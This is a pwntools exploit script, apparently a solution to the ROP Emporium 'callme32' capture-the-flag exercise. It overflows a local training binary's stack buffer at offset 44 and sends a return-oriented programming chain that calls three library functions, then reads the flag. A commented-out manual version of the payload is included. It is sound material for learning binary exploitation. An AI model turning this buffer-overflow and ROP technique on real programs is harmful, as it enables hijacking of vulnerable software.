import time

from pwn import *


EXECUTABLE = "./callme32"
context.binary = elf = ELF(EXECUTABLE)
lib_callme = ELF("./libcallme32.so")


p = process(EXECUTABLE)

OFFSET = 44
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128))

    time.sleep(1)
    core = Coredump("./core")
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(core.fault_addr)}")
    offset = cyclic_find(core.fault_addr)
    log.success(f"Offset found: {offset}")
    exit()

params = [
    0xdeadbeef,
    0xcafebabe,
    0xd00df00d,
]

rop = ROP(elf)
rop.callme_one(*params)
rop.callme_two(*params)
rop.callme_three(*params)

log.debug("Sending rop chain:\n" + rop.dump())
p.sendafter(b"> ", flat({ OFFSET: rop.chain() }))

# Manual solution
# payload  = b"A" * OFFSET
# payload += p32(elf.plt.callme_one)   + p32(0x080484aa) + p32(params[0]) + p32(params[1]) + p32(params[2])
# payload += p32(elf.plt.callme_two)   + p32(0x080484aa) + p32(params[0]) + p32(params[1]) + p32(params[2])
# payload += p32(elf.plt.callme_three) + p32(0x080484aa) + p32(params[0]) + p32(params[1]) + p32(params[2])
# p.sendafter(b"> ", payload)

p.recvline() # Thank you
p.recvline() # callme_one called correctly
p.recvline() # callme_two called correctly

flag = str(p.recvline(), "UTF-8")
log.success(f"Flag: {flag}")
